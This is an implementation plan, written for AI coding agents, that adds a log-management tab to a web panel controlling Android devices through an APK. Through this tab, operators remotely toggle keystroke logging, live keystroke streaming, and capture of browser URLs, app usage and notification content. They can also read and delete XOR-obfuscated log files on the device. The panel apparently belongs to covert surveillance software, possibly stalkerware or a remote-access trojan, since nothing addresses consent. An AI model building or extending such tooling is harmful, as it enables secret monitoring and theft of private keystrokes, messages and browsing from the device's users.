# Device Log Management Panel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a "日志管理" tab to the device control panel that lets operators view real-time logs, query historical logs from the database, manage device-side log files (list/read/delete), and configure log recording options — all via WebSocket commands + Laravel API.

**Architecture:** Frontend adds a `LogTab.vue` component and `useDeviceLogs.ts` composable following the existing tab pattern (KeylogTab, FilesTab). WebSocket commands (`GET_LOG_LIST`, `READ_LOG`, `SET_LOG_OPTIONS`, etc.) go to the APK's LogCommandHandler for device-side file operations. Laravel's `DeviceLogController` (already created) serves historical log queries from `device_logs` table. A new Inertia-compatible web route handles panel-side log queries.

**Tech Stack:** Vue 3 + Naive UI (frontend), TypeScript (composable), PHP 8.5 / Laravel 12 (backend), WebSocket (device commands)

---

## Current State

### Already Done (from prior tasks)

- `device_logs` table migration — exists
- `DeviceLog` model — exists with `device()`, `user()` relationships
- `DeviceLogController::store()` — APK upload endpoint `POST /api/client/logs`
- `DeviceLogController::index()` — API query endpoint `GET /api/device-logs` (Sanctum auth)
- `StoreDeviceLogRequest` / `QueryDeviceLogRequest` — validation classes exist
- APK `LogCommandHandler` — 8 commands wired to `ActivityMonitor`
- APK `ActivityMonitor` — XOR file write, read, delete, clear all working

### What This Plan Adds

| Component | Purpose |
|-----------|---------|
| `LogTab.vue` | New tab in Control.vue for log management UI |
| `useDeviceLogs.ts` | Composable for WebSocket log commands + HTTP API queries |
| `DeviceController::deviceLogs()` | Web route for panel log queries (Inertia auth) |
| `Control.vue` modifications | Register new tab, handle log_command_result messages |
| `device.ts` type additions | LogEntry, LogFileInfo, LogOptions interfaces |

---

## File Structure

### Create

| File | Responsibility |
|------|---------------|
| `app/resources/ts/Components/DeviceControl/tabs/LogTab.vue` | Log management UI: options toggle, file browser, log content viewer, historical query |
| `app/resources/ts/composables/useDeviceLogs.ts` | WebSocket commands (GET_LOG_LIST, READ_LOG, SET_LOG_OPTIONS, etc.) + HTTP API (query device_logs table) |

### Modify

| File | Change |
|------|--------|
| `app/resources/ts/Pages/Devices/Control.vue` | Add 'logs' tab, handle `log_command_result` WebSocket messages, wire LogTab events |
| `app/resources/ts/types/device.ts` | Add LogEntry, LogFileInfo, LogOptions types |
| `app/app/Http/Controllers/DeviceController.php` | Add `deviceLogs()` method for panel web route |
| `app/routes/web.php` | Add `GET /devices/{device}/logs` web route |

---

## Tasks

### Task 1: Add TypeScript Types for Log Module

**Files:**
- Modify: `app/resources/ts/types/device.ts`

- [ ] **Step 1: Add log-related type definitions**

Append to the end of `app/resources/ts/types/device.ts`:

```typescript
// Log types — matches APK ActivityMonitor.LogType enum
export type LogType = 'ACTZ' | 'KSTR' | 'BLNK' | 'VAPS' | 'NTFS' | 'ARTS' | 'SEVT';

export const LOG_TYPE_LABELS: Record<LogType, string> = {
    ACTZ: '用户操作',
    KSTR: '键盘记录',
    BLNK: '浏览器URL',
    VAPS: 'APP使用',
    NTFS: '通知内容',
    ARTS: '系统事件',
    SEVT: '敏感事件',
};

export interface LogFileInfo {
    type: LogType;
    filename: string;
}

export interface LogOptions {
    recKeystrokes: boolean;
    liveKeystrokes: boolean;
    recApps: boolean;
    recLinks: boolean;
    recNotifications: boolean;
}

export interface DeviceLogEntry {
    id: number;
    device_id: number;
    log_type: LogType;
    content: string;
    device_timestamp: string;
    device_uid: string;
    created_at: string;
}

export interface DataLoadingState {
    sms: boolean;
    contacts: boolean;
    files: boolean;
    apps: boolean;
    keylog: boolean;
    logs: boolean;
}
```

Note: `DataLoadingState` already exists at line 89 — add the `logs: boolean` field to the existing interface.

- [ ] **Step 2: Commit**

---

### Task 2: Create useDeviceLogs Composable

**Files:**
- Create: `app/resources/ts/composables/useDeviceLogs.ts`

- [ ] **Step 1: Create the composable file**

```typescript
import { ref, type Ref } from 'vue';
import type { WebSocketOutboundMessage } from '@/types/websocket';
import type { LogType, LogOptions, DeviceLogEntry } from '@/types/device';
import axios from 'axios';

type SendFunction = (message: WebSocketOutboundMessage) => boolean;

const REQUEST_TIMEOUT = 8000;

export function useDeviceLogs(
    send: SendFunction,
    deviceId: Ref<string>,
    deviceUuid: Ref<string>,
) {
    const loading = ref(false);
    const logFiles = ref<Record<string, string>>({});
    const logContent = ref('');
    const logOptions = ref<LogOptions>({
        recKeystrokes: true,
        liveKeystrokes: false,
        recApps: true,
        recLinks: true,
        recNotifications: true,
    });
    const historicalLogs = ref<DeviceLogEntry[]>([]);
    const historicalTotal = ref(0);
    const historicalLoading = ref(false);

    const sendCommand = (command: string, params: Record<string, unknown> = {}): boolean => {
        return send({
            command,
            params,
            pid: deviceId.value,
        });
    };

    const getLogList = (type: LogType) => {
        loading.value = true;
        setTimeout(() => { if (loading.value) loading.value = false; }, REQUEST_TIMEOUT);
        return sendCommand('GET_LOG_LIST', { type });
    };

    const getAllLogLists = () => {
        loading.value = true;
        setTimeout(() => { if (loading.value) loading.value = false; }, REQUEST_TIMEOUT);
        return sendCommand('GET_ALL_LOG_LISTS');
    };

    const readLog = (type: LogType, filename: string) => {
        loading.value = true;
        setTimeout(() => { if (loading.value) loading.value = false; }, REQUEST_TIMEOUT);
        return sendCommand('READ_LOG', { type, filename });
    };

    const deleteLog = (type: LogType, filename: string) => {
        return sendCommand('DELETE_LOG', { type, filename });
    };

    const clearLogs = (type: LogType) => {
        return sendCommand('CLEAR_LOGS', { type });
    };

    const clearAllLogs = () => {
        return sendCommand('CLEAR_ALL_LOGS');
    };

    const setLogOptions = (options: Partial<LogOptions>) => {
        return sendCommand('SET_LOG_OPTIONS', options);
    };

    const getLogOptions = () => {
        loading.value = true;
        setTimeout(() => { if (loading.value) loading.value = false; }, REQUEST_TIMEOUT);
        return sendCommand('GET_LOG_OPTIONS');
    };

    const fetchHistoricalLogs = async (params: {
        log_type?: LogType;
        start_time?: string;
        end_time?: string;
        per_page?: number;
        page?: number;
    } = {}) => {
        historicalLoading.value = true;
        try {
            const response = await axios.get(`/devices/${deviceUuid.value}/logs`, {
                params: {
                    ...params,
                    device_uid: deviceId.value,
                },
            });
            if (response.data?.success) {
                const paginated = response.data.data;
                historicalLogs.value = paginated.data ?? [];
                historicalTotal.value = paginated.total ?? 0;
            }
        } catch (e) {
            console.error('Failed to fetch historical logs', e);
        } finally {
            historicalLoading.value = false;
        }
    };

    const handleLogCommandResult = (data: Record<string, unknown>) => {
        loading.value = false;
        const command = data.command as string | undefined;

        if (data.options) {
            logOptions.value = data.options as LogOptions;
        }
        if (data.files !== undefined) {
            if (data.lists) {
                logFiles.value = data.lists as Record<string, string>;
            } else if (data.type) {
                logFiles.value = {
                    ...logFiles.value,
                    [data.type as string]: data.files as string,
                };
            }
        }
        if (data.content !== undefined) {
            logContent.value = data.content as string;
        }
    };

    return {
        loading,
        logFiles,
        logContent,
        logOptions,
        historicalLogs,
        historicalTotal,
        historicalLoading,
        getLogList,
        getAllLogLists,
        readLog,
        deleteLog,
        clearLogs,
        clearAllLogs,
        setLogOptions,
        getLogOptions,
        fetchHistoricalLogs,
        handleLogCommandResult,
    };
}
```

- [ ] **Step 2: Commit**

---

### Task 3: Create LogTab.vue Component

**Files:**
- Create: `app/resources/ts/Components/DeviceControl/tabs/LogTab.vue`

- [ ] **Step 1: Create the component**

```vue
<script setup lang="ts">
import { ref, computed } from 'vue';
import {
    NCard,
    NSpace,
    NButton,
    NSelect,
    NSwitch,
    NDataTable,
    NEmpty,
    NSpin,
    NIcon,
    NGrid,
    NGridItem,
    NDivider,
    NDatePicker,
    NTag,
    NPopconfirm,
    NAlert,
    NScrollbar,
} from 'naive-ui';
import {
    RefreshOutline,
    TrashOutline,
    DocumentTextOutline,
    SettingsOutline,
    FolderOpenOutline,
    TimeOutline,
    SearchOutline,
} from '@vicons/ionicons5';
import type { LogType, LogOptions, DeviceLogEntry } from '@/types/device';
import { LOG_TYPE_LABELS } from '@/types/device';

interface Props {
    loading: boolean;
    logFiles: Record<string, string>;
    logContent: string;
    logOptions: LogOptions;
    historicalLogs: DeviceLogEntry[];
    historicalTotal: number;
    historicalLoading: boolean;
}

interface Emits {
    (e: 'getLogOptions'): void;
    (e: 'setLogOptions', options: Partial<LogOptions>): void;
    (e: 'getAllLogLists'): void;
    (e: 'getLogList', type: LogType): void;
    (e: 'readLog', type: LogType, filename: string): void;
    (e: 'deleteLog', type: LogType, filename: string): void;
    (e: 'clearLogs', type: LogType): void;
    (e: 'clearAllLogs'): void;
    (e: 'fetchHistorical', params: {
        log_type?: LogType;
        start_time?: string;
        end_time?: string;
        per_page?: number;
        page?: number;
    }): void;
}

const props = defineProps<Props>();
const emit = defineEmits<Emits>();

const activeSection = ref<'options' | 'files' | 'history'>('history');
const selectedLogType = ref<LogType>('KSTR');
const historyLogType = ref<LogType | null>(null);
const historyDateRange = ref<[number, number] | null>(null);
const historyPage = ref(1);

const logTypeOptions = computed(() =>
    Object.entries(LOG_TYPE_LABELS).map(([value, label]) => ({
        label: `${label} (${value})`,
        value,
    }))
);

const parsedFileList = computed(() => {
    const files: Array<{ type: string; filename: string; typeLabel: string }> = [];
    for (const [type, fileStr] of Object.entries(props.logFiles)) {
        if (!fileStr || fileStr === 'null') continue;
        const parts = fileStr.split('<*P*>').filter(Boolean);
        for (const part of parts) {
            files.push({
                type,
                filename: part,
                typeLabel: LOG_TYPE_LABELS[type as LogType] ?? type,
            });
        }
    }
    return files;
});

const fileColumns = [
    { title: '类型', key: 'typeLabel', width: 100 },
    { title: '文件名', key: 'filename' },
    {
        title: '操作',
        key: 'actions',
        width: 140,
        render: (row: { type: string; filename: string }) => {
            return h(NSpace, { size: 'small' }, () => [
                h(NButton, {
                    size: 'tiny',
                    type: 'info',
                    onClick: () => emit('readLog', row.type as LogType, row.filename),
                }, { default: () => '读取' }),
                h(NPopconfirm, {
                    onPositiveClick: () => emit('deleteLog', row.type as LogType, row.filename),
                }, {
                    trigger: () => h(NButton, { size: 'tiny', type: 'error' }, { default: () => '删除' }),
                    default: () => '确定删除此日志文件？',
                }),
            ]);
        },
    },
];

const historyColumns = [
    {
        title: '类型',
        key: 'log_type',
        width: 90,
        render: (row: DeviceLogEntry) =>
            h(NTag, { size: 'small', type: 'info' }, { default: () => LOG_TYPE_LABELS[row.log_type] ?? row.log_type }),
    },
    { title: '内容', key: 'content', ellipsis: { tooltip: true } },
    { title: '设备时间', key: 'device_timestamp', width: 170 },
];

const handleFetchHistory = () => {
    const params: Record<string, unknown> = { per_page: 50, page: historyPage.value };
    if (historyLogType.value) params.log_type = historyLogType.value;
    if (historyDateRange.value) {
        params.start_time = new Date(historyDateRange.value[0]).toISOString().split('T')[0];
        params.end_time = new Date(historyDateRange.value[1]).toISOString().split('T')[0];
    }
    emit('fetchHistorical', params);
};

const handlePageChange = (page: number) => {
    historyPage.value = page;
    handleFetchHistory();
};

import { h } from 'vue';
</script>

<template>
    <div class="log-tab">
        <!-- Section Switcher -->
        <div class="tab-header">
            <NSpace>
                <NButton
                    :type="activeSection === 'history' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'history'"
                >
                    <template #icon><NIcon :component="TimeOutline" /></template>
                    历史日志
                </NButton>
                <NButton
                    :type="activeSection === 'files' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'files'; emit('getAllLogLists')"
                >
                    <template #icon><NIcon :component="FolderOpenOutline" /></template>
                    设备文件
                </NButton>
                <NButton
                    :type="activeSection === 'options' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'options'; emit('getLogOptions')"
                >
                    <template #icon><NIcon :component="SettingsOutline" /></template>
                    日志设置
                </NButton>
            </NSpace>
        </div>

        <NDivider style="margin: 8px 0" />

        <!-- Section: Log Options -->
        <div v-if="activeSection === 'options'" class="section">
            <NSpin :show="loading">
                <NGrid :cols="2" :x-gap="12" :y-gap="12">
                    <NGridItem>
                        <div class="option-row">
                            <span>键盘记录 (KSTR)</span>
                            <NSwitch
                                :value="logOptions.recKeystrokes"
                                @update:value="(v: boolean) => emit('setLogOptions', { recKeystrokes: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>实时键盘流</span>
                            <NSwitch
                                :value="logOptions.liveKeystrokes"
                                @update:value="(v: boolean) => emit('setLogOptions', { liveKeystrokes: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>APP使用 (VAPS)</span>
                            <NSwitch
                                :value="logOptions.recApps"
                                @update:value="(v: boolean) => emit('setLogOptions', { recApps: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>浏览器URL (BLNK)</span>
                            <NSwitch
                                :value="logOptions.recLinks"
                                @update:value="(v: boolean) => emit('setLogOptions', { recLinks: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>通知内容 (NTFS)</span>
                            <NSwitch
                                :value="logOptions.recNotifications"
                                @update:value="(v: boolean) => emit('setLogOptions', { recNotifications: v })"
                            />
                        </div>
                    </NGridItem>
                </NGrid>
            </NSpin>
        </div>

        <!-- Section: Device-side log files -->
        <div v-else-if="activeSection === 'files'" class="section">
            <div class="file-actions">
                <NSpace>
                    <NButton size="small" @click="emit('getAllLogLists')">
                        <template #icon><NIcon :component="RefreshOutline" /></template>
                        刷新文件列表
                    </NButton>
                    <NPopconfirm @positive-click="emit('clearAllLogs')">
                        <template #trigger>
                            <NButton size="small" type="error">
                                <template #icon><NIcon :component="TrashOutline" /></template>
                                清空所有日志
                            </NButton>
                        </template>
                        确定清空设备上的所有日志文件？此操作不可逆。
                    </NPopconfirm>
                </NSpace>
            </div>

            <NSpin :show="loading">
                <NDataTable
                    v-if="parsedFileList.length > 0"
                    :columns="fileColumns"
                    :data="parsedFileList"
                    :bordered="false"
                    :max-height="300"
                    size="small"
                />
                <NEmpty v-else description="设备上没有日志文件" />
            </NSpin>

            <!-- Log content viewer -->
            <div v-if="logContent" class="log-content-viewer">
                <NDivider style="margin: 8px 0" />
                <div class="content-header">
                    <NIcon :component="DocumentTextOutline" size="16" />
                    <span>日志内容</span>
                </div>
                <NScrollbar style="max-height: 300px">
                    <pre class="log-content">{{ logContent }}</pre>
                </NScrollbar>
            </div>
        </div>

        <!-- Section: Historical logs from DB -->
        <div v-else-if="activeSection === 'history'" class="section">
            <div class="history-filters">
                <NSpace>
                    <NSelect
                        v-model:value="historyLogType"
                        :options="[{ label: '全部类型', value: null }, ...logTypeOptions]"
                        size="small"
                        style="width: 160px"
                        placeholder="日志类型"
                        clearable
                    />
                    <NDatePicker
                        v-model:value="historyDateRange"
                        type="daterange"
                        size="small"
                        clearable
                        :shortcuts="{
                            '今天': () => {
                                const now = Date.now();
                                return [now - 86400000, now];
                            },
                            '最近7天': () => {
                                const now = Date.now();
                                return [now - 7 * 86400000, now];
                            },
                        }"
                    />
                    <NButton size="small" type="primary" @click="handleFetchHistory">
                        <template #icon><NIcon :component="SearchOutline" /></template>
                        查询
                    </NButton>
                </NSpace>
            </div>

            <NSpin :show="historicalLoading">
                <NDataTable
                    v-if="historicalLogs.length > 0"
                    :columns="historyColumns"
                    :data="historicalLogs"
                    :bordered="false"
                    :max-height="400"
                    size="small"
                    :pagination="{
                        page: historyPage,
                        pageSize: 50,
                        itemCount: historicalTotal,
                        onUpdatePage: handlePageChange,
                    }"
                />
                <NEmpty v-else description="暂无历史日志，点击查询加载" />
            </NSpin>
        </div>
    </div>
</template>

<style scoped>
.log-tab {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.tab-header {
    display: flex;
    justify-content: flex-start;
    align-items: center;
}

.section {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.option-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 12px;
    background: #f8fafc;
    border-radius: 8px;
    font-size: 13px;
}

.file-actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.history-filters {
    display: flex;
    align-items: center;
    margin-bottom: 8px;
}

.log-content-viewer {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.content-header {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    color: #64748b;
    font-weight: 500;
}

.log-content {
    font-family: 'Fira Code', 'Consolas', monospace;
    font-size: 12px;
    line-height: 1.5;
    padding: 12px;
    background: #1e293b;
    color: #e2e8f0;
    border-radius: 8px;
    white-space: pre-wrap;
    word-break: break-all;
    margin: 0;
}
</style>
```

- [ ] **Step 2: Commit**

---

### Task 4: Add Laravel Web Route for Panel Log Queries

**Files:**
- Modify: `app/app/Http/Controllers/DeviceController.php`
- Modify: `app/routes/web.php`

- [ ] **Step 1: Add deviceLogs method to DeviceController**

Add at the end of the `DeviceController` class (before the closing `}`):

```php
use App\Models\DeviceLog;

public function deviceLogs(Request $request, Device $device): JsonResponse
{
    $validated = $request->validate([
        'device_uid' => 'nullable|string|max:64',
        'log_type' => 'nullable|string|in:ACTZ,KSTR,BLNK,VAPS,NTFS,ARTS,SEVT',
        'start_time' => 'nullable|date',
        'end_time' => 'nullable|date|after_or_equal:start_time',
        'per_page' => 'nullable|integer|min:1|max:100',
        'page' => 'nullable|integer|min:1',
    ]);

    $query = DeviceLog::where('device_id', $device->id);

    if (! empty($validated['log_type'])) {
        $query->where('log_type', $validated['log_type']);
    }
    if (! empty($validated['start_time'])) {
        $query->where('device_timestamp', '>=', $validated['start_time']);
    }
    if (! empty($validated['end_time'])) {
        $query->where('device_timestamp', '<=', $validated['end_time']);
    }

    $logs = $query->orderByDesc('device_timestamp')
        ->paginate($validated['per_page'] ?? 50);

    return response()->json([
        'success' => true,
        'data' => $logs,
    ]);
}
```

- [ ] **Step 2: Add web route**

In `app/routes/web.php`, inside the `middleware('permission:devices.control')` group (where the frpc routes are), add:

```php
Route::get('/devices/{device}/logs', [DeviceController::class, 'deviceLogs']);
```

- [ ] **Step 3: Commit**

---

### Task 5: Wire LogTab into Control.vue

**Files:**
- Modify: `app/resources/ts/Pages/Devices/Control.vue`

This is the most complex task. It requires 4 changes in Control.vue:

- [ ] **Step 1: Add imports**

At the top of `<script setup>`, add:

```typescript
import LogTab from '@/Components/DeviceControl/tabs/LogTab.vue';
import { useDeviceLogs } from '@/composables/useDeviceLogs';
import type { LogType } from '@/types/device';
```

Also add the icon import for the tab:

```typescript
import { DocumentTextOutline } from '@vicons/ionicons5';
```

(Check if `DocumentTextOutline` is already imported — add only if missing.)

- [ ] **Step 2: Initialize useDeviceLogs composable**

After the existing composable initializations (near `useDeviceData`, `useScreenControl`), add:

```typescript
const deviceLogs = useDeviceLogs(send, deviceId, computed(() => props.device.uuid));
```

(The `computed` wrapper is needed because `deviceUuid` is a `Ref<string>`.)

- [ ] **Step 3: Add 'logs' tab to tabList**

In the `tabList` array (around line 774), add a new entry:

```typescript
{ name: 'logs', label: '日志', icon: DocumentTextOutline },
```

- [ ] **Step 4: Handle log_command_result WebSocket messages**

In the `handleMessage` function's switch/case (or if/else chain), add a case for `log_command_result`:

```typescript
case 'log_command_result': {
    const resultData = (msg as Record<string, unknown>).data ?? msg;
    deviceLogs.handleLogCommandResult(resultData as Record<string, unknown>);
    break;
}
```

- [ ] **Step 5: Add LogTab template**

In the template section where other tabs are rendered (inside the tab content area, near the KeylogTab, SmsTab, etc.), add:

```vue
<LogTab
    v-else-if="activeTab === 'logs'"
    :loading="deviceLogs.loading.value"
    :log-files="deviceLogs.logFiles.value"
    :log-content="deviceLogs.logContent.value"
    :log-options="deviceLogs.logOptions.value"
    :historical-logs="deviceLogs.historicalLogs.value"
    :historical-total="deviceLogs.historicalTotal.value"
    :historical-loading="deviceLogs.historicalLoading.value"
    @get-log-options="deviceLogs.getLogOptions"
    @set-log-options="deviceLogs.setLogOptions"
    @get-all-log-lists="deviceLogs.getAllLogLists"
    @get-log-list="deviceLogs.getLogList"
    @read-log="deviceLogs.readLog"
    @delete-log="deviceLogs.deleteLog"
    @clear-logs="deviceLogs.clearLogs"
    @clear-all-logs="deviceLogs.clearAllLogs"
    @fetch-historical="deviceLogs.fetchHistoricalLogs"
/>
```

- [ ] **Step 6: Add tab activation handler for 'logs'**

In the `handleTabChange` function (or equivalent tab switch handler), add:

```typescript
case 'logs':
    deviceLogs.fetchHistoricalLogs();
    break;
```

- [ ] **Step 7: Commit**

---

### Task 6: Update DataLoadingState Type

**Files:**
- Modify: `app/resources/ts/types/device.ts`
- Modify: `app/resources/ts/composables/useDeviceData.ts`

- [ ] **Step 1: Add 'logs' field to DataLoadingState**

In `app/resources/ts/types/device.ts`, find the `DataLoadingState` interface (line ~89) and add:

```typescript
export interface DataLoadingState {
    sms: boolean;
    contacts: boolean;
    files: boolean;
    apps: boolean;
    keylog: boolean;
    logs: boolean;    // NEW
}
```

- [ ] **Step 2: Update useDeviceData initial state**

In `app/resources/ts/composables/useDeviceData.ts`, find the `loading` ref initialization (line ~25) and add:

```typescript
const loading = ref<DataLoadingState>({
    sms: false,
    contacts: false,
    files: false,
    apps: false,
    keylog: false,
    logs: false,    // NEW
});
```

- [ ] **Step 3: Commit**

---

### Task 7: Verify Frontend Build

- [ ] **Step 1: Type check**

Run: `cd /home/code/php/project/full-package/app && npx vue-tsc --noEmit`
Expected: No type errors

- [ ] **Step 2: Vite build**

Run: `cd /home/code/php/project/full-package/app && npm run build`
Expected: Build succeeds

- [ ] **Step 3: Commit (if any fixes needed)**

---

## Verification Checklist

### Frontend
- [ ] "日志" tab appears in Control.vue tab bar
- [ ] Clicking "日志" tab loads the LogTab component
- [ ] "历史日志" section queries `GET /devices/{device}/logs` and shows paginated results
- [ ] "设备文件" section sends `GET_ALL_LOG_LISTS` WebSocket command and displays file list
- [ ] Clicking "读取" on a file sends `READ_LOG` and displays decrypted content
- [ ] Clicking "删除" on a file sends `DELETE_LOG` after confirmation
- [ ] "清空所有日志" sends `CLEAR_ALL_LOGS` after confirmation
- [ ] "日志设置" section sends `GET_LOG_OPTIONS` on mount and displays toggle switches
- [ ] Toggling a switch sends `SET_LOG_OPTIONS` with the changed field
- [ ] `log_command_result` WebSocket messages update the UI state

### Backend
- [ ] `GET /devices/{device}/logs` returns paginated DeviceLog records
- [ ] Route requires `devices.control` permission
- [ ] Query filters work: log_type, start_time, end_time

### Integration
- [ ] APK sends `operation_log` → DeviceHandler persists to device_logs → Panel queries and displays
- [ ] Panel sends `SET_LOG_OPTIONS` → APK updates ActivityMonitor flags → Panel gets confirmation
- [ ] Panel sends `READ_LOG` → APK reads XOR-encrypted file → Panel displays decrypted content

---

## Key File Paths

### Frontend
- `app/resources/ts/Components/DeviceControl/tabs/LogTab.vue` (NEW)
- `app/resources/ts/composables/useDeviceLogs.ts` (NEW)
- `app/resources/ts/Pages/Devices/Control.vue` (MODIFY — add tab + message handler)
- `app/resources/ts/types/device.ts` (MODIFY — add types)
- `app/resources/ts/composables/useDeviceData.ts` (MODIFY — add logs loading state)

### Backend
- `app/app/Http/Controllers/DeviceController.php` (MODIFY — add deviceLogs method)
- `app/routes/web.php` (MODIFY — add route)

### Existing (no changes needed)
- `app/app/Http/Controllers/Api/DeviceLogController.php` — APK upload + API query
- `app/app/Models/DeviceLog.php` — model
- `app/database/migrations/2026_04_20_120000_create_device_logs_table.php` — migration
